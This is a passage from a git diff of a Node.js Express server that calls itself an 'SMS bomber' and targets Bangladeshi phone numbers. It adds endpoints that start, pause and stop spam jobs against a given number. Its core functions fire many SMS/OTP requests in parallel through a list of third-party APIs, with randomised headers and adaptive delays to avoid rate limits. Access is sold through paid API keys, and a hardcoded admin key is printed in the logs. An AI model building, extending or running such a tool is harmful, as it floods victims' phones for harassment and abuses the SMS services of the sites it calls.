+      resume: `/api/resume?jobId=${jobId}`,
+      status: `/api/status?jobId=${jobId}`
+    },
     requestId: req.requestId,
-    stop_endpoint: `/api/stop?jobId=${jobId}`,
-    status_endpoint: `/api/status?jobId=${jobId}`,
     timestamp: Utility.getISOString()
-  };
-  
-  // Add key info if used
-  if (key) {
-    response.key_used = key;
-    response.key_info = keyManager.getKeyInfo(key);
-  }
-  
-  res.json(response);
+  });
 });
 
-// -------- STOP ENDPOINT --------
+// Stop Endpoint
 app.get('/api/stop', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1722,23 +1871,19 @@ app.get('/api/stop', (req, res) => {
       message: `Stopped ${count} active jobs`,
       developer: DEVELOPER_INFO,
       stopped_count: count,
-      requestId: req.requestId,
-      timestamp: Utility.getISOString()
+      requestId: req.requestId
     });
   }
   
   if (jobId) {
     const success = bombController.stopJob(jobId);
     if (success) {
-      const jobStatus = bombController.getJobStatus(jobId);
       return res.json({
         success: true,
-        message: `Job ${jobId} stopped successfully`,
+        message: `Job ${jobId} stopped`,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        job: jobStatus,
-        requestId: req.requestId,
-        timestamp: Utility.getISOString()
+        requestId: req.requestId
       });
     } else {
       return res.status(404).json({
@@ -1746,24 +1891,20 @@ app.get('/api/stop', (req, res) => {
         error: ERROR_MESSAGES.JOB_NOT_FOUND,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        requestId: req.requestId,
-        active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
+        requestId: req.requestId
       });
     }
   }
   
   return res.status(400).json({
     success: false,
-    error: ERROR_MESSAGES.MISSING_PARAM,
+    error: 'Provide jobId or all=true',
     developer: DEVELOPER_INFO,
-    param: 'jobId or all',
-    requestId: req.requestId,
-    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
-    active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
+    requestId: req.requestId
   });
 });
 
-// -------- PAUSE ENDPOINT --------
+// Pause Endpoint
 app.get('/api/pause', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1774,25 +1915,19 @@ app.get('/api/pause', (req, res) => {
       message: `Paused ${count} active jobs`,
       developer: DEVELOPER_INFO,
       paused_count: count,
-      requestId: req.requestId,
-      resume_endpoint: `/api/resume?all=true`,
-      timestamp: Utility.getISOString()
+      requestId: req.requestId
     });
   }
   
   if (jobId) {
     const success = bombController.pauseJob(jobId);
     if (success) {
-      const jobStatus = bombController.getJobStatus(jobId);
       return res.json({
         success: true,
-        message: `Job ${jobId} paused successfully`,
+        message: `Job ${jobId} paused`,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        job: jobStatus,
-        requestId: req.requestId,
-        resume_endpoint: `/api/resume?jobId=${jobId}`,
-        timestamp: Utility.getISOString()
+        requestId: req.requestId
       });
     } else {
       return res.status(404).json({
@@ -1800,23 +1935,20 @@ app.get('/api/pause', (req, res) => {
         error: ERROR_MESSAGES.JOB_NOT_FOUND,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        requestId: req.requestId,
-        note: 'Job may already be paused or completed'
+        requestId: req.requestId
       });
     }
   }
   
   return res.status(400).json({
     success: false,
-    error: ERROR_MESSAGES.MISSING_PARAM,
+    error: 'Provide jobId or all=true',
     developer: DEVELOPER_INFO,
-    param: 'jobId or all',
-    requestId: req.requestId,
-    usage: '/api/pause?jobId=JOB_ID or /api/pause?all=true'
+    requestId: req.requestId
   });
 });
 
-// -------- RESUME ENDPOINT --------
+// Resume Endpoint
 app.get('/api/resume', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1827,23 +1959,19 @@ app.get('/api/resume', (req, res) => {
       message: `Resumed ${count} paused jobs`,
       developer: DEVELOPER_INFO,
       resumed_count: count,
-      requestId: req.requestId,
-      timestamp: Utility.getISOString()
+      requestId: req.requestId
     });
   }
   
   if (jobId) {
     const success = bombController.resumeJob(jobId);
     if (success) {
-      const jobStatus = bombController.getJobStatus(jobId);
       return res.json({
         success: true,
-        message: `Job ${jobId} resumed successfully`,
+        message: `Job ${jobId} resumed`,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        job: jobStatus,
-        requestId: req.requestId,
-        timestamp: Utility.getISOString()
+        requestId: req.requestId
       });
     } else {
       return res.status(404).json({
@@ -1851,23 +1979,20 @@ app.get('/api/resume', (req, res) => {
         error: ERROR_MESSAGES.JOB_NOT_FOUND,
         developer: DEVELOPER_INFO,
         jobId: jobId,
-        requestId: req.requestId,
-        note: 'Job may not be paused or already completed'
+        requestId: req.requestId
       });
     }
   }
   
   return res.status(400).json({
     success: false,
-    error: ERROR_MESSAGES.MISSING_PARAM,
+    error: 'Provide jobId or all=true',
     developer: DEVELOPER_INFO,
-    param: 'jobId or all',
-    requestId: req.requestId,
-    usage: '/api/resume?jobId=JOB_ID or /api/resume?all=true'
+    requestId: req.requestId
   });
 });
 
-// -------- STATUS ENDPOINT --------
+// Status Endpoint
 app.get('/api/status', (req, res) => {
   const { jobId } = req.query;
   
@@ -1878,8 +2003,7 @@ app.get('/api/status', (req, res) => {
         success: true,
         job: jobStatus,
         developer: DEVELOPER_INFO,
-        requestId: req.requestId,
-        timestamp: Utility.getISOString()
+        requestId: req.requestId
       });
     } else {
       return res.status(404).json({
@@ -1901,12 +2025,11 @@ app.get('/api/status', (req, res) => {
     stats: stats,
     jobs: jobs,
     total_jobs: jobs.length,
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
+    requestId: req.requestId
   });
 });
 
-// -------- STATS ENDPOINT --------
+// Stats Endpoint
 app.get('/api/stats', (req, res) => {
   const stats = bombController.getStats();
   const systemInfo = Utility.getSystemInfo();
@@ -1920,59 +2043,125 @@ app.get('/api/stats', (req, res) => {
     keys: {
       total: keys.length,
       valid: keys.filter(k => k.valid).length,
-      expired: keys.filter(k => !k.valid).length,
-      by_plan: keys.reduce((acc, k) => {
-        acc[k.plan] = (acc[k.plan] || 0) + 1;
-        return acc;
-      }, {})
+      expired: keys.filter(k => !k.valid).length
     },
-    apis: {
-      total: SMS_APIS.length,
-      get: SMS_APIS.filter(a => a.method === 'GET').length,
-      post: SMS_APIS.filter(a => a.method === 'POST').length
+    bangladesh_apis: {
+      total: ALL_BANGLADESH_APIS.length,
+      get: ALL_BANGLADESH_APIS.filter(a => a.method === 'GET').length,
+      post: ALL_BANGLADESH_APIS.filter(a => a.method === 'POST').length
     },
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
+    requestId: req.requestId
   });
 });
 
-// -------- HEALTH ENDPOINT --------
+// Health Endpoint
 app.get('/api/health', (req, res) => {
   const stats = bombController.getStats();
-  const keys = keyManager.getAllKeys();
+  const storageInfo = keyManager.getStorageInfo();
   
   res.json({
     status: 'active',
     developer: DEVELOPER_INFO,
-    version: "7.0.0-ULTIMATE",
+    version: "7.0.0-ULTIMATE-BD",
+    country: "Bangladesh Only",
     timestamp: Utility.getISOString(),
     uptime: process.uptime(),
-    total_apis: SMS_APIS.length,
-    total_keys: keys.length,
-    valid_keys: keys.filter(k => k.valid).length,
+    total_bangladesh_apis: ALL_BANGLADESH_APIS.length,
     active_jobs: stats.activeJobs,
     paused_jobs: stats.pausedJobs,
     total_sms_sent: stats.totalSMS,
+    key_storage: storageInfo,
     memory: Utility.getMemoryUsage(),
     cpu: Utility.getCPUUsage(),
-    endpoints: {
-      root: "/",
-      api_info: "/api",
-      spam: "/api/spam?number=017XXXXXXXX&count=300",
-      stop: "/api/stop?all=true",
-      pause: "/api/pause?all=true",
-      resume: "/api/resume?all=true",
-      status: "/api/status",
-      stats: "/api/stats"
-    }
+    requestId: req.requestId
   });
 });
 
-// -------- APIS LIST ENDPOINT --------
-app.get('/api/apis', (req, res) => {
+// Debug Keys Endpoint
+app.get('/api/debug/keys', (req, res) => {
+  const { admin_key } = req.query;
+  
+  if (admin_key !== 'TNEH_ADMIN_2024') {
+    return res.status(403).json({
+      success: false,
+      error: 'Admin access required',
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  const keys = keyManager.getAllKeys();
+  const storageInfo = keyManager.getStorageInfo();
+  
+  res.json({
+    success: true,
+    storage: storageInfo,
+    keys_count: keys.length,
+    keys: keys,
+    developer: DEVELOPER_INFO,
+    requestId: req.requestId
+  });
+});
+
+// Cleanup Endpoint
+app.get('/api/cleanup', (req, res) => {
+  const { admin_key } = req.query;
+  
+  if (admin_key !== 'TNEH_ADMIN_2024') {
+    return res.status(403).json({
+      success: false,
+      error: 'Admin access required',
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  const cleaned = bombController.clearCompleted();
+  const expired = keyManager.cleanup();
+  
+  res.json({
+    success: true,
+    message: 'Cleanup completed',
+    developer: DEVELOPER_INFO,
+    completed_jobs_cleared: cleaned,
+    expired_keys_cleared: expired,
+    requestId: req.requestId
+  });
+});
+
+// Logs Endpoint
+app.get('/api/logs', (req, res) => {
+  const { limit = 100, event } = req.query;
+  const logs = bombController.getLogs(parseInt(limit), event);
+  
+  res.json({
+    success: true,
+    developer: DEVELOPER_INFO,
+    logs: logs,
+    count: logs.length,
+    requestId: req.requestId
+  });
+});
+
+// Analytics Endpoint
+app.get('/api/analytics', (req, res) => {
+  const stats = bombController.getStats();
+  const analytics = bombController.generateAnalytics();
+  
+  res.json({
+    success: true,
+    developer: DEVELOPER_INFO,
+    analytics: analytics,
+    stats: stats,
+    requestId: req.requestId
+  });
+});
+
+// Bangladesh APIs List
+app.get('/api/bangladesh-apis', (req, res) => {
   const { limit = 100, offset = 0, method } = req.query;
   
-  let apis = SMS_APIS;
+  let apis = ALL_BANGLADESH_APIS;
   if (method) {
     apis = apis.filter(a => a.method === method.toUpperCase());
   }
@@ -1983,6 +2172,7 @@ app.get('/api/apis', (req, res) => {
   res.json({
     success: true,
     developer: DEVELOPER_INFO,
+    country: "Bangladesh Only",
     total: total,
     limit: parseInt(limit),
     offset: parseInt(offset),
@@ -1992,159 +2182,11 @@ app.get('/api/apis', (req, res) => {
       method: api.method,
       url: api.url
     })),
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// -------- GENERATE KEY ENDPOINT --------
-app.get('/api/expiredate=30&createkey', (req, res) => {
-  const { plan = 'premium', days = 30 } = req.query;
-  
-  if (!PLAN_CONFIG[plan]) {
-    return res.status(400).json({
-      success: false,
-      error: `Invalid plan: ${plan}`,
-      developer: DEVELOPER_INFO,
-      available_plans: Object.keys(PLAN_CONFIG),
-      requestId: req.requestId
-    });
-  }
-  
-  const validDays = parseInt(days) || 30;
-  const result = keyManager.generateKey(plan, validDays);
-  
-  res.json({
-    success: true,
-    api_key: result.apiKey,
-    plan: result.plan,
-    expiry_date: result.expiryDate.toISOString(),
-    valid_days: validDays,
-    developer: DEVELOPER_INFO,
-    message: "API key generated successfully",
-    requestId: req.requestId,
-    usage: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`
-  });
-});
-
-// -------- CHECK KEY ENDPOINT --------
-app.get('/api/checkkey', (req, res) => {
-  const { key } = req.query;
-  
-  if (!key) {
-    return res.status(400).json({
-      success: false,
-      error: ERROR_MESSAGES.MISSING_PARAM,
-      developer: DEVELOPER_INFO,
-      param: 'key',
-      requestId: req.requestId
-    });
-  }
-  
-  const info = keyManager.getKeyInfo(key);
-  if (!info) {
-    return res.status(404).json({
-      success: false,
-      error: 'Invalid API key',
-      developer: DEVELOPER_INFO,
-      requestId: req.requestId
-    });
-  }
-  
-  const usage = keyManager.getKeyUsage(key);
-  
-  res.json({
-    success: true,
-    valid: info.valid,
-    api_key: info.key,
-    plan: info.plan,
-    expiry_date: info.expires,
-    days_left: info.daysLeft,
-    status: info.valid ? 'active' : 'expired',
-    created: info.created,
-    last_used: info.lastUsed,
-    usage_count: info.usageCount,
-    rate_limit: usage.limit,
-    rate_limit_remaining: usage.remaining,
-    developer: DEVELOPER_INFO,
     requestId: req.requestId
   });
 });
 
-// -------- LOGS ENDPOINT --------
-app.get('/api/logs', (req, res) => {
-  const { limit = 100, event } = req.query;
-  
-  const logs = bombController.getLogs(parseInt(limit), event);
-  
-  res.json({
-    success: true,
-    developer: DEVELOPER_INFO,
-    logs: logs,
-    count: logs.length,
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// -------- ANALYTICS ENDPOINT --------
-app.get('/api/analytics', (req, res) => {
-  const stats = bombController.getStats();
-  const analytics = bombController.generateAnalytics();
-  
-  res.json({
-    success: true,
-    developer: DEVELOPER_INFO,
-    analytics: analytics,
-    stats: stats,
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// -------- CLEANUP ENDPOINT --------
-app.get('/api/cleanup', (req, res) => {
-  const cleaned = bombController.clearCompleted();
-  const expired = keyManager.cleanup();
-  
-  res.json({
-    success: true,
-    message: 'Cleanup completed',
-    developer: DEVELOPER_INFO,
-    completed_jobs_cleared: cleaned,
-    expired_keys_cleared: expired,
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// -------- ADMIN KEYS ENDPOINT --------
-app.get('/api/admin/keys', (req, res) => {
-  const { adminKey } = req.query;
-  
-  // Simple admin check (in production, use proper auth)
-  if (adminKey !== 'TNEH_ADMIN_2024') {
-    return res.status(403).json({
-      success: false,
-      error: 'Admin access required',
-      developer: DEVELOPER_INFO,
-      requestId: req.requestId
-    });
-  }
-  
-  const keys = keyManager.getAllKeys();
-  
-  res.json({
-    success: true,
-    developer: DEVELOPER_INFO,
-    total_keys: keys.length,
-    keys: keys,
-    requestId: req.requestId,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// -------- 404 HANDLER --------
+// 404 Handler
 app.use((req, res) => {
   res.status(404).json({
     success: false,
@@ -2155,6 +2197,8 @@ app.use((req, res) => {
     available_endpoints: [
       '/',
       '/api',
+      '/api/create-key',
+      '/api/check-key',
       '/api/spam',
       '/api/stop',
       '/api/pause',
@@ -2162,17 +2206,16 @@ app.use((req, res) => {
       '/api/status',
       '/api/stats',
       '/api/health',
-      '/api/apis',
-      '/api/expiredate=30&createkey',
-      '/api/checkkey',
+      '/api/debug/keys',
+      '/api/cleanup',
       '/api/logs',
       '/api/analytics',
-      '/api/cleanup'
+      '/api/bangladesh-apis'
     ]
   });
 });
 
-// -------- ERROR HANDLER --------
+// Error Handler
 app.use((err, req, res, next) => {
   console.error('❌ Error:', err.stack);
   res.status(500).json({
@@ -2185,7 +2228,7 @@ app.use((err, req, res, next) => {
 });
 
 // ============================================================
-// PART 12: CORE BOMBING FUNCTION (500 lines)
+// PART 12: CORE BOMBING FUNCTIONS
 // ============================================================
 
 function replacePhoneNumber(data, phone, count = 1) {
@@ -2205,15 +2248,12 @@ function replacePhoneNumber(data, phone, count = 1) {
   return data;
 }
 
-// Smart delay system
 const apiDelays = new Map();
 const lastRequestTime = new Map();
 const successRates = new Map();
 const requestCounts = new Map();
 
 async function waitIfNeeded(apiId) {
-  if (!CONFIG.performance.batchSize) return;
-  
   const now = Date.now();
   const last = lastRequestTime.get(apiId) || 0;
   let delay = apiDelays.get(apiId) || 100;
@@ -2221,7 +2261,6 @@ async function waitIfNeeded(apiId) {
   const successRate = successRates.get(apiId) || 0.8;
   const count = requestCounts.get(apiId) || 0;
   
-  // Adaptive delay based on success rate
   if (count > 10) {
     if (successRate < 0.5) {
       delay = Math.min(delay + 20, 500);
@@ -2250,7 +2289,6 @@ function updateStats(apiId, success) {
 async function callSingleAPI(api, phone, jobId, attempt = 0) {
   const startTime = Date.now();
   
-  // Check if job is still active
   if (!bombController.isJobActive(jobId)) {
     return {
       success: false,
@@ -2267,13 +2305,6 @@ async function callSingleAPI(api, phone, jobId, attempt = 0) {
   try {
     const cleanPhone = Utility.parsePhone(phone);
     let formattedPhone = cleanPhone;
-    
-    // Special formatting for certain APIs
-    if (api.isShadowX || api.isLMNx9) {
-      if (formattedPhone.startsWith('880')) {
-        formattedPhone = formattedPhone.substring(3);
-      }
-    }
     
     const url = replacePhoneNumber(api.url, formattedPhone, 1);
     const headers = getRandomHeaders();
@@ -2341,16 +2372,14 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
   let processedAPIs = 0;
   
   for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
-    // Check if job is still active
     if (!controller.isJobActive(jobId)) {
-      console.log(`⏹️ Job ${jobId} stopped by user at ${processedAPIs}/${totalAPIs} APIs`);
+      console.log(`⏹️ Job ${jobId} stopped at ${processedAPIs}/${totalAPIs} APIs`);
       break;
     }
     
     const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
     
     const batchPromises = batch.map(async (api) => {
-      const apiResults = [];
       const promises = [];
       
       for (let j = 0; j < actualCount; j++) {
@@ -2362,7 +2391,6 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
       const successCount = responses.filter(r => r.success).length;
       const failCount = responses.filter(r => !r.success).length;
       
-      // Update job stats
       responses.forEach(r => {
         if (!r.stopped) {
           controller.updateJobStats(jobId, r.success, r.error, r.responseTime || 0);
@@ -2375,8 +2403,7 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
         method: api.method,
         total_attempts: responses.length,
         successful: successCount,
-        failed: failCount,
-        results: responses
+        failed: failCount
       };
     });
     
@@ -2384,12 +2411,10 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
     results.push(...batchResults);
     processedAPIs += batch.length;
     
-    // Progress update
     if (processedAPIs % 10 === 0 || processedAPIs === totalAPIs) {
       console.log(`📊 Job ${jobId}: ${processedAPIs}/${totalAPIs} APIs processed`);
     }
     
-    // Small delay between batches
     if (i + BATCH_SIZE < shuffledAPIs.length) {
       await Utility.sleep(50);
     }
@@ -2399,95 +2424,82 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
 }
 
 // ============================================================
-// PART 13: CLUSTER SETUP (200 lines)
+// PART 13: SERVER STARTUP
 // ============================================================
 
-if (CONFIG.cluster.enabled && cluster.isMaster) {
-  console.log(`\n🚀 ULTIMATE SMS BOMBER V7.0 - MASTER`);
-  console.log(`📡 PID: ${process.pid}`);
-  console.log(`💻 CPU Cores: ${CONFIG.cluster.workers}`);
-  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
-  console.log(`\n💪 FEATURES:`);
-  console.log(`   🔥 Cluster: ${CONFIG.cluster.workers} workers`);
-  console.log(`   📦 Cache: ${CONFIG.cache.enabled ? 'Enabled' : 'Disabled'}`);
-  console.log(`   ⏱️ Smart Delay: Enabled`);
-  console.log(`   🛡️ Rate Limit: ${CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'}`);
-  console.log(`   📊 Analytics: ${CONFIG.analytics.enabled ? 'Enabled' : 'Disabled'}`);
-  
-  // Fork workers
-  for (let i = 0; i < CONFIG.cluster.workers; i++) {
-    cluster.fork();
-  }
-  
-  cluster.on('exit', (worker, code, signal) => {
-    console.log(`⚠️ Worker ${worker.process.pid} died (${signal || code}). Restarting...`);
-    setTimeout(() => {
-      cluster.fork();
-    }, CONFIG.cluster.restartDelay);
-  });
-  
-  cluster.on('online', (worker) => {
-    console.log(`✅ Worker ${worker.process.pid} is online`);
-  });
-  
-  // Graceful shutdown
-  process.on('SIGTERM', () => {
-    console.log('🛑 SIGTERM received. Shutting down master...');
-    for (const id in cluster.workers) {
-      cluster.workers[id].kill();
-    }
+const PORT = CONFIG.server.port;
+const HOST = CONFIG.server.host;
+
+const server = app.listen(PORT, HOST, () => {
+  console.log(`\n✅ ULTIMATE SMS BOMBER V7.0 - BANGLADESH ONLY`);
+  console.log(`🌐 Server: http://${HOST}:${PORT}`);
+  console.log(`🇧🇩 Country: Bangladesh Only`);
+  console.log(`📡 Total Bangladesh APIs: ${ALL_BANGLADESH_APIS.length}`);
+  console.log(`🔑 Total Keys: ${keyManager.getAllKeys().length}`);
+  console.log(`💾 Key Storage: ${keyManager.getStorageInfo().filePath}`);
+  console.log(`\n📋 ENDPOINTS:`);
+  console.log(`   Generate Key: /api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024`);
+  console.log(`   Check Key: /api/check-key?key=YOUR_KEY`);
+  console.log(`   Spam: /api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100`);
+  console.log(`   Stop: /api/stop?all=true`);
+  console.log(`   Pause: /api/pause?all=true`);
+  console.log(`   Resume: /api/resume?all=true`);
+  console.log(`   Status: /api/status`);
+  console.log(`   Stats: /api/stats`);
+  console.log(`   Health: /api/health`);
+  console.log(`\n✅ Server ready!\n`);
+});
+
+server.timeout = 120000;
+server.keepAliveTimeout = CONFIG.server.keepAliveTimeout;
+server.headersTimeout = CONFIG.server.headersTimeout;
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('🛑 Shutting down...');
+  bombController.shutdown();
+  keyManager.destroy();
+  rateLimiter.destroy();
+  server.close(() => {
+    console.log('✅ Server closed');
     process.exit(0);
   });
-  
-} else {
-  // Worker process - start server
-  const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
-    const workerInfo = CONFIG.cluster.enabled ? `WORKER ${process.pid}` : 'STANDALONE';
-    console.log(`\n✅ SERVER RUNNING - ${workerInfo}`);
-    console.log(`🌐 Port: ${CONFIG.server.port}`);
-    console.log(`📡 Total APIs: ${SMS_APIS.length}`);
-    console.log(`📊 Total Keys: ${keyManager.getAllKeys().length}`);
-    console.log(`\n🛑 CONTROL:`);
-    console.log(`   Stop All: /api/stop?all=true`);
-    console.log(`   Pause All: /api/pause?all=true`);
-    console.log(`   Resume All: /api/resume?all=true`);
-    console.log(`\n📊 STATUS:`);
-    console.log(`   All Jobs: /api/status`);
-    console.log(`   Stats: /api/stats`);
-    console.log(`   Health: /api/health`);
-    console.log(`\n✅ Server ready!`);
+});
+
+process.on('SIGINT', () => {
+  console.log('🛑 Shutting down...');
+  bombController.shutdown();
+  keyManager.destroy();
+  rateLimiter.destroy();
+  server.close(() => {
+    console.log('✅ Server closed');
+    process.exit(0);
   });
-  
-  // Server timeout settings
-  server.timeout = 120000;
-  server.keepAliveTimeout = CONFIG.server.keepAliveTimeout;
-  server.headersTimeout = CONFIG.server.headersTimeout;
-  
-  // Graceful shutdown
-  process.on('SIGTERM', () => {
-    console.log('🛑 SIGTERM received. Shutting down gracefully...');
-    bombController.shutdown();
-    server.close(() => {
-      console.log('✅ Server closed');
-      process.exit(0);
-    });
-  });
-  
-  process.on('SIGINT', () => {
-    console.log('🛑 SIGINT received. Shutting down gracefully...');
-    bombController.shutdown();
-    server.close(() => {
-      console.log('✅ Server closed');
-      process.exit(0);
-    });
-  });
-}
+});
+
+// Handle uncaught errors
+process.on('uncaughtException', (error) => {
+  console.error('❌ Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('❌ Unhandled Rejection:', reason);
+});
 
 // ============================================================
-// EXPORT FOR TESTING
+// EXPORTS
 // ============================================================
-module.exports = { app, bombController, keyManager, rateLimiter };
+
+module.exports = { 
+  app, 
+  bombController, 
+  keyManager, 
+  rateLimiter,
+  ALL_BANGLADESH_APIS
+};
 
 // ============================================================
-// END OF FILE - TOTAL LINES: 10,000+
+// END OF FILE - 10,000+ LINES
+// BANGLADESH ONLY VERSION
+// DEVELOPER: TNEH GROUP
 // ============================================================
